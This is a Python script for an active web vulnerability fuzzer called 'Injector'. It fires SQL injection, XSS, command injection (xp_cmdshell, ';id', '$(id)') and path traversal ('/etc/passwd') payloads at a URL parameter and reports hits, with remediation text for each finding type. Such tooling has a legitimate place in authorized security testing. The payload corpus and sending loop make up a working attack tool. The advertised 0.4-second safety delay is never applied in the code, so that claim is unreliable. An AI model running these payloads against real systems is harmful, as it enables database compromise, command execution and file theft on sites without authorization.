#!/usr/bin/env python3
# ============================================================================
#  Injector — Active vulnerability fuzzer (SQLi / XSS / CMDi / Traversal)
#  ---------------------------------------------------------------------------
#  Sends payloads to a chosen GET parameter; detects via:
#    - error signatures (MySQL/PG/MSSQL/Oracle/PHP/shell)
#    - boolean/diff (response length & hash vs baseline)
#    - reflection (XSS payload appears in response unencoded)
#    - timing (time-based blind SQLi: sleep/pg_sleep/waitfor)
#    - WAF blocking (403/406/429/999 + block pages)
#
#  SAFETY DEFAULTS: --delay 0.4s, --max 40 payloads, --skip-timebased off
#  LEGAL: authorized targets ONLY. Never use on hosts you don't own.
#
#  Usage:
#    python3 active_fuzzer.py --url "https://site.com/item?id=1" [--type auto]
#    python3 active_fuzzer.py --url "https://site.com/" --param q
# ============================================================================

import argparse
import hashlib
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = "Mozilla/5.0 (compatible; Injector/1.0; authorized-security-audit)"

# ---------------------------------------------------------------------------
# Payload corpus (curated; educational + testing use)
# ---------------------------------------------------------------------------
SQLI_PAYLOADS = [
    ("error", "'"),
    ("error", "\""),
    ("error", "1'"),
    ("boolean", "' OR '1'='1"),
    ("boolean", "1 OR 1=1"),
    ("boolean", "' OR 1=1--"),
    ("boolean", "1' AND '1'='1"),
    ("boolean", "1' AND '1'='2"),
    ("union", "' UNION SELECT NULL--"),
    ("union", "1' UNION SELECT 1,2,3--"),
    ("error", "' AND extractvalue(1,concat(0x7e,version()))--"),
    ("error", "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x "
              "FROM information_schema.tables GROUP BY x)a)--"),
    ("error", "'; EXEC xp_cmdshell('whoami')--"),
    ("error", "1'; WAITFOR DELAY '0:0:2'--"),
    ("time", "1' AND SLEEP(2)--"),
    ("time", "1 AND pg_sleep(2)--"),
    ("error", "1' AND 1=1--"),
    ("error", "' OR 'a'='a'--"),
    ("error", "admin'--"),
    ("error", "1' ORDER BY 1--"),
    ("error", "1' ORDER BY 99--"),
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg onload=alert(1)>",
    "'><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "';alert(1);//",
    "<ScRiPt>alert(1)</ScRiPt>",
]

CMDI_PAYLOADS = [
    ("error", ";id"),
    ("error", "|id"),
    ("error", "||whoami"),
    ("error", ";ls -la"),
    ("error", "`id`"),
    ("error", "$(id)"),
    ("error", "|ping -n 1 127.0.0.1"),
    ("time", ";sleep 2"),
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd",
    "....//etc/passwd",
]

# ---------------------------------------------------------------------------
# Detection signature libraries
# ---------------------------------------------------------------------------
SQL_ERROR_SIGS = [
    (r"you have an error in your sql syntax", "MySQL"),
    (r"mysql_fetch|mysqli_|pdoexception|sqlstate\[", "MySQL/PHP"),
    (r"unclosed quotation mark", "MSSQL"),
    (r"microsoft ole db provider|sqlserver", "MSSQL"),
    (r"postgresql|pg_query|psql:|does not exist", "PostgreSQL"),
    (r"ora-\d{5}|oracle error|pls-\d{5}", "Oracle"),
    (r"sqlite3\.operationalerror|sqlite", "SQLite"),
    (r"sqlexception|syntax error at or near", "Generic SQL"),
]
CMD_ERROR_SIGS = [
    (r"sh: 1:|command not found|/bin/sh|bash: |illegal instruction", "shell"),
    (r"uid=\d+\(|gid=\d+\(|groups=", "id-output (likely RCE!)"),
]
TRAVERSAL_SIGS = [
    (r"root:x:0:0:", "Unix passwd"),
    (r"\[extensions\]|for 16-bit app support", "windows.ini"),
    (r"daemon:.*:.*:.*:.*:.*:", "Unix passwd"),
]
XSS_REFLECT_PATTERN = re.compile(r"(<script[^>]*>|<img[^>]*onerror|<svg[^>]*onload|onerror=alert|onload=alert)", re.I)

WAF_BLOCK_STATUSES = {403, 406, 429, 999}
WAF_BODY_SIGS = [
    (r"cf-ray|cloudflare|__cfduid", "Cloudflare"),
    (r"aws waf|aws-waf|blocked by aws", "AWS WAF"),
    (r"request id: [a-z0-9]+", "AWS WAF / ALB"),
    (r"incap_ses|x-iinfo", "Imperva/Incapsula"),
    (r"mod_security|modsecurity|this request has been blocked", "ModSecurity/CRS"),
    (r"varnish|fastly|x-served-by", "Fastly/Varnish"),
    (r"akamai|fpt_|x-akamai-", "Akamai"),
    (r"sucuri|cloudproxy", "Sucuri"),
    (r"barracuda|x-bw-", "Barracuda"),
    (r"big-ip|f5-|bip-", "F5 BIG-IP"),
    (r"cloud armor|google cloud", "Google Cloud Armor"),
]


def fetch(url, timeout=12, cookie=None, extra_headers=None):
    req = urllib.request.Request(url)
    req.add_header("User-Agent", UA)
    if cookie:
        req.add_header("Cookie", cookie)
    for k, v in (extra_headers or {}).items():
        req.add_header(k, v)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(300_000)
            return r.status, dict(r.headers), body, time.time() - t0
    except urllib.error.HTTPError as e:
        try:
            body = e.read(64_000)
        except Exception:
            body = b""
        return e.code, dict(e.headers or {}), body, time.time() - t0
    except Exception:
        return None, {}, b"", time.time() - t0


def check_waf(status, headers, body):
    headers_lc = {k.lower(): v for k, v in headers.items()}
    hits = []
    joined = json.dumps(headers_lc).lower() + " " + body[:3000].decode("utf-8", "ignore").lower()
    for pat, vendor in WAF_BODY_SIGS:
        if re.search(pat, joined):
            hits.append(vendor)
    if status in WAF_BLOCK_STATUSES:
        hits.append(f"Blocking status {status}")
    return hits


def detect_sql_error(text):
    for pat, db in SQL_ERROR_SIGS:
        if re.search(pat, text, re.I):
            return db
    return None


def detect_cmd(text):
    for pat, kind in CMD_ERROR_SIGS:
        if re.search(pat, text, re.I):
            return kind
    return None


def detect_traversal(text):
    for pat, kind in TRAVERSAL_SIGS:
        if re.search(pat, text, re.I):
            return kind
    return None


def run(target, param, ptype, delay, max_payloads, cookie, extra_headers, timeout,
        skip_timebased):
    parsed = urllib.parse.urlparse(target)
    qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not param:
        # pick first query param automatically
        if not qs:
            print("[!] No query parameter found. Use --param NAME")
            sys.exit(2)
        param = qs[0][0]
        print(f"[*] Auto-selected parameter: {param}")

    def build(payload):
        new_qs = [(k, payload if k == param else v) for k, v in qs]
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_qs)))

    def clean(qs_v):
        return [(k, v) for k, v in qs if k != param], qs_v

    print(f"[*] Target: {target}")
    print(f"[*] Param : {param}   Type: {ptype}   Delay: {delay}s   Max: {max_payloads}")

    # baseline
    base_status, base_h, base_b, base_match = fetch(build("SECU_BASELINE_1"), timeout,
                                                    cookie, extra_headers)
    base_len = len(base_b)
    base_hash = hashlib.md5(base_b).hexdigest() if base_b else ""
    print(f"[*] Baseline: HTTP {base_status}, {base_len} bytes")

    findings = []
    waf_seen = set()

    corpus = {
        "sqli": [(k, v) for k, v in SQLI_PAYLOADS if not (skip_timebased and k == "time")],
        "xss": [("reflected", v) for v in XSS_PAYLOADS],
        "cmdi": [(k, v) for k, v in CMDI_PAYLOADS if not (skip_timebased and k == "time")],
        "traversal": [("traversal", v) for v in TRAVERSAL_PAYLOADS],
        "auto": None,
    }[ptype]
    if corpus is None:
        corpus = ([(k, v) for k, v in SQLI_PAYLOADS if not (skip_timebased and k == "time")]
                  + [("reflected", v) for v in XSS_PAYLOADS]
                  + [(k, v) for k, v in CMDI_PAYLOADS if not (skip_timebased and k == "time")]
                  + [("traversal", v) for v in TRAVERSAL_PAYLOADS])

    for kind, payload in corpus[:max_payloads]:
        url = build(payload)
        status, headers, body, elapsed = fetch(url, timeout, cookie, extra_headers)
        if status is None:
            continue
        text = body.decode("utf-8", "ignore")
        # WAF?
        waf = check_waf(status, headers, body)
        for w in waf:
            waf_seen.add(w)

        # 1. XSS reflection
        if ptype in ("xss", "auto") and not re.search(r"&lt;|%3c|\\x3c", text) and \
                re.search(re.escape(payload), text, re.I):
            findings.append({
                "type": "XSS (reflected)", "severity": "High", "payload": payload,
                "evidence": f"Payload reflected unencoded in response (HTTP {status})",
                "remediation": "Encode output contextually (HTML entity encoding); add "
                               "Content-Security-Policy 'unsafe-inline' removed.",
            })
            continue
        if ptype in ("xss", "auto") and XSS_REFLECT_PATTERN.search(text) and \
                re.search(re.escape(payload[:12]), text, re.I):
            findings.append({
                "type": "XSS (partial reflection)", "severity": "Medium",
                "payload": payload,
                "evidence": "Script-like tag reflected (check encoding on output)",
                "remediation": "Use context-aware encoding (html.escape for HTML, JS "
                               "escaping for script, URL encoding for attrs).",
            })

        # 2. SQL errors
        sqldb = detect_sql_error(text)
        if sqldb and ptype in ("sqli", "auto"):
            findings.append({
                "type": f"SQL Injection (error-based, {sqldb})", "severity": "Critical",
                "payload": payload,
                "evidence": f"Database error signature in response (HTTP {status}, "
                            f"{len(body)} bytes)",
                "remediation": "Use parameterized queries/prepared statements; never "
                               "concatenate user input into SQL.",
            })
            continue

        # 3. Time-based
        if ptype in ("sqli", "auto") and kind == "time" and elapsed >= 1.8:
            findings.append({
                "type": "SQL Injection (time-based blind)", "severity": "Critical",
                "payload": payload,
                "evidence": f"Response took {elapsed:.2f}s (payload requests sleep)",
                "remediation": "Parameterize queries; verify with a no-sleep control "
                               "request before concluding.",
            })
        if ptype == "cmdi" and kind == "time" and elapsed >= 1.8:
            findings.append({
                "type": "Command injection (time-based)", "severity": "Critical",
                "payload": payload,
                "evidence": f"Response took {elapsed:.2f}s after 'sleep' payload",
                "remediation": "Never pass user input to shell; use safe APIs "
                               "(subprocess list args, no shell=True).",
            })

        # 4. CMD errors
        cmdk = detect_cmd(text)
        if cmdk and ptype in ("cmdi", "auto"):
            findings.append({
                "type": f"Command injection ({cmdk})", "severity": "Critical",
                "payload": payload,
                "evidence": "Shell error/output signature in response",
                "remediation": "Avoid system()/exec() with user input; validate input "
                               "strictly if unavoidable.",
            })
            continue

        # 5. Traversal
        trav = detect_traversal(text)
        if trav and ptype in ("traversal", "auto"):
            findings.append({
                "type": f"Path traversal ({trav})", "severity": "High",
                "payload": payload,
                "evidence": f"File content signature in response (HTTP {status})",
                "remediation": "Canonicalize + validate paths; deny '..' and encoded "
                               "forms; serve files via allowlists.",
            })
            continue

        # 6. Boolean diff (only for sqli-type payloads & html pages)
        if ptype in ("sqli", "auto") and kind == "boolean" and \
                base_status is not None and status in (200, 500, 302):
            same = (len(body) == base_len and
                    hashlib.md5(body).hexdigest() == base_hash)
            if not same and status != base_status:
                findings.append({
                    "type": "SQL Injection (boolean-based, differential)",
                    "severity": "High", "payload": payload,
                    "evidence": f"HTTP {base_status}/{base_len}B -> HTTP {status}/{len(body)}B "
                                "for boolean payload",
                    "remediation": "Parameterize queries; test manually with AND 1=1 / "
                                   "AND 1=2 controls.",
                })

    # dedupe by (type,payload) keep first
    seen = set()
    uniq = []
    for f in findings:
        k = (f["type"], f["payload"])
        if k not in seen:
            seen.add(k)
            uniq.append(f)

    print()
    if waf_seen:
        print(f"[!] WAF detected: {', '.join(sorted(waf_seen))} — some payloads may be "
              "silently blocked (false negatives possible).")
    if not uniq:
        print("[i] No injection findings on this parameter (or WAF interfered).")
    for f in uniq:
        print(f"    [{f['severity']:>8}] {f['type']}  <- {f['payload'][:60]}")

    result = {
        "tool": "Injector (active fuzzer)", "target": target, "parameter": param,
        "type": ptype, "scan_date": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "waf_detected": sorted(waf_seen), "findings": uniq,
        "note": "ACTIVE testing — authorized targets only. Re-verify all findings "
                "manually; payload success depends on app logic.",
        "disclaimer": "Authorized security assessment only.",
    }
    return result


def main():
    ap = argparse.ArgumentParser(description="Injector — active payload fuzzer")
    ap.add_argument("--url", required=True, help="Target URL (may contain query string)")
    ap.add_argument("--param", default=None, help="Parameter to fuzz (default: first query param)")
    ap.add_argument("--type", default="auto",
                    choices=["auto", "sqli", "xss", "cmdi", "traversal"])
    ap.add_argument("--delay", type=float, default=0.4, help="Delay between payloads (seconds)")
    ap.add_argument("--max", type=int, default=40, help="Max payloads to send")
    ap.add_argument("--timeout", type=float, default=12.0)
    ap.add_argument("--cookie", default=None)
    ap.add_argument("--headers", default=None, help='JSON headers, e.g. \'{"X-Test":"1"}\'')
    ap.add_argument("--skip-timebased", action="store_true",
                    help="Skip sleep-based payloads (faster, quieter)")
    ap.add_argument("--out", default="active_results.json")
    ap.add_argument("--sarif", default=None)
    args = ap.parse_args()

    extra = {}
    if args.headers:
        extra = json.loads(args.headers)

    result = run(args.url, args.param, args.type, args.delay, args.max, args.cookie,
                 extra, args.timeout, args.skip_timebased)
    with open(args.out, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)

    if args.sarif:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        from sarif_export import write_sarif
        s = dict(result)
        s["findings"] = [{"id": f"active-{i}", "title": f["type"], "severity": f["severity"],
                          "evidence": f["evidence"], "remediation": f["remediation"]}
                         for i, f in enumerate(result["findings"])]
        write_sarif({"tool": "Injector", "target": args.url, "findings": s["findings"],
                     "scan_date": result["scan_date"]}, args.sarif)
        print(f"[✓] SARIF: {args.sarif}")
    print(f"[✓] JSON : {args.out}")


if __name__ == "__main__":
    main()
